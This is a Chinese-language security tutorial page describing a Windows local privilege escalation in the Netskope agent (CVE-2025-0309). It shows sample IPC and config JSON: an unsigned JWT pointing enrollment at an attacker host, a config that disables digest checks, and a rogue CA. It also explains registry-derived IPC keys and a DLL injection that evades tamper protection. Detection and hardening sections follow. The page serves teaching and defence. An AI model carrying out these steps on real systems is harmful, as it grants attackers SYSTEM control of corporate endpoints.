# 滥用企业自动更新器和特权 IPC (e.g., Netskope stAgentSvc)

{{#include ../../banners/hacktricks-training.md}}

本页概述了一类在企业端点代理和更新器中发现的 Windows 本地提权链，这些组件暴露出低摩擦的 IPC 接口和特权更新流程。一个代表性示例是 Netskope Client for Windows < R129 (CVE-2025-0309)，其中低权限用户可以强制将注册指向攻击者控制的服务器，然后投递一个恶意 MSI，由 SYSTEM 服务安装。

可以复用到类似产品的关键思路：
- 滥用特权服务的 localhost IPC，强制重新注册或重新配置到攻击者服务器。
- 实现厂商的 update endpoints，部署伪造的 Trusted Root CA，并将 updater 指向恶意的“签名”包。
- 绕过薄弱的签名者校验（CN allow‑lists）、可选的 digest 标志和宽松的 MSI 属性。
- 如果 IPC 是“encrypted”，可从注册表中可被所有人读取的机器标识派生 key/IV。
- 如果服务按 image path/process name 限制调用者，注入到被允许的进程或以 suspended 启动一个进程，然后通过最小的 thread‑context patch 引导你的 DLL。

---
## 1) 通过 localhost IPC 强制注册到攻击者服务器

许多代理都会随附一个以用户模式运行的 UI 进程，该进程通过 localhost TCP 使用 JSON 与运行在 SYSTEM 的服务通信。

在 Netskope 中观察到：
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

利用流程：
1) 构造一个 JWT enrollment token，其 claims 控制后端主机（例如 AddonUrl）。使用 alg=None，因此不需要签名。
2) 发送调用 provisioning 命令的 IPC 消息，包含你的 JWT 和 tenant name：
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) 服务开始访问你的恶意服务器以进行 enrollment/config，例如：
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- 如果调用者验证是基于 path/name‑based，则应从一个被允许的厂商二进制程序发起请求（见 §4）。

---
## 2) Hijacking the update channel to run code as SYSTEM

一旦客户端与您的服务器通信，实现预期的 endpoints 并引导它到攻击者的 MSI。典型流程：

1) /v2/config/org/clientconfig → 返回 JSON 配置，包含非常短的 updater 间隔，例如：
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → 返回一个 PEM CA certificate。该服务将其安装到 Local Machine Trusted Root store。
3) /v2/checkupdate → 提供指向恶意 MSI 的元数据和一个伪造的版本。

绕过野外常见检查：
- Signer CN allow‑list：服务可能只检查 Subject CN 是否等于 “netSkope Inc” 或 “Netskope, Inc.”。你的伪造 CA 可以签发一个具有该 CN 的 leaf 并签署 MSI。
- CERT_DIGEST property：包含一个名为 CERT_DIGEST 的良性 MSI 属性。安装时不强制执行。
- Optional digest enforcement：配置标志（例如 check_msi_digest=false）会禁用额外的密码学验证。

结果：SYSTEM 服务会从
C:\ProgramData\Netskope\stAgent\data\*.msi
安装你的 MSI，并以 NT AUTHORITY\SYSTEM 身份执行任意代码。

---
## 3) Forging encrypted IPC requests (when present)

从 R127 开始，Netskope 将 IPC JSON 包装在看起来像 Base64 的 encryptData 字段中。逆向分析显示使用 AES，key/IV 来源于任何用户都可读取的注册表值：
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

攻击者可以重现加密并从标准用户发送有效的加密命令。一般建议：如果代理突然对其 IPC “加密”，检查 HKLM 下的 device IDs、product GUIDs、install IDs 等作为密钥材料。

---
## 4) Bypassing IPC caller allow‑lists (path/name checks)

一些服务尝试通过解析 TCP 连接的 PID 并将映像路径/名称与位于 Program Files 下的允许列表厂商二进制（例如 stagentui.exe、bwansvc.exe、epdlp.exe）进行比对来认证对端。

两个实用的绕过方法：
- 对一个允许列表进程（例如 nsdiag.exe）进行 DLL injection，并从其内部代理 IPC。
- 以挂起态启动一个允许列表二进制，并在不使用 CreateRemoteThread 的情况下引导你的代理 DLL（见 §5），以满足驱动强制的防篡改规则。

---
## 5) Tamper‑protection friendly injection: suspended process + NtContinue patch

产品常配备一个 minifilter/OB callbacks driver（例如 Stadrv）以从受保护进程的句柄中剥离危险权限：
- Process：移除 PROCESS_TERMINATE、PROCESS_CREATE_THREAD、PROCESS_VM_READ、PROCESS_DUP_HANDLE、PROCESS_SUSPEND_RESUME
- Thread：限制为 THREAD_GET_CONTEXT、THREAD_QUERY_LIMITED_INFORMATION、THREAD_RESUME、SYNCHRONIZE

一个可靠的用户模式加载器，遵守这些限制的步骤：
1) CreateProcess 启动一个厂商二进制并使用 CREATE_SUSPENDED。
2) 获取你仍被允许的句柄：对进程为 PROCESS_VM_WRITE | PROCESS_VM_OPERATION，对线程为具有 THREAD_GET_CONTEXT/THREAD_SET_CONTEXT（或如果在已知 RIP 处打补丁，仅 THREAD_RESUME）。
3) 覆盖 ntdll!NtContinue（或其他早期、保证映射的 thunk）为一个小的存根，该存根对你的 DLL 路径调用 LoadLibraryW，然后跳回原处。
4) ResumeThread 触发你在进程内的存根，加载你的 DLL。

因为你从未对一个已经受保护的进程使用 PROCESS_CREATE_THREAD 或 PROCESS_SUSPEND_RESUME（你是创建它的），驱动的策略被满足。

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) 自动化生成 rogue CA、恶意 MSI 签名，并提供所需端点：/v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate。
- UpSkope 是一个自定义 IPC 客户端，可构造任意（可选 AES‑encrypted）IPC 消息，并包含挂起进程注入以使调用源自允许列表二进制。

---
## 7) Detection opportunities (blue team)
- 监控对 Local Machine Trusted Root 的添加。Sysmon + registry‑mod 事件（参见 SpecterOps guidance）效果良好。
- 标记由 agent 的 service 从类似 C:\ProgramData\<vendor>\<agent>\data\*.msi 路径发起的 MSI 执行。
- 检查 agent 日志中异常的 enrollment hosts/tenants，例如：C:\ProgramData\netskope\stagent\logs\nsdebuglog.log – 查找 addonUrl / tenant 异常和 provisioning msg 148。
- 对非预期签名二进制或来自异常子进程树的 localhost IPC 客户端发出告警。

---
## Hardening tips for vendors
- 将 enrollment/update 主机绑定到严格的 allow‑list；在 clientcode 中拒绝不受信任的域名。
- 使用 OS 原语（ALPC security、named‑pipe SIDs）对 IPC 对等方进行认证，而不是依赖映像路径/名称检查。
- 将秘密材料保存在不可全局读取的 HKLM 之外；如果必须对 IPC 加密，应从受保护的密钥派生或通过认证通道协商。
- 将 updater 视为供应链面：要求完整链至受信任的 CA（由你控制），使用 pinned keys 验证包签名，并在配置禁用验证时 fail closed。

## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)

{{#include ../../banners/hacktricks-training.md}}
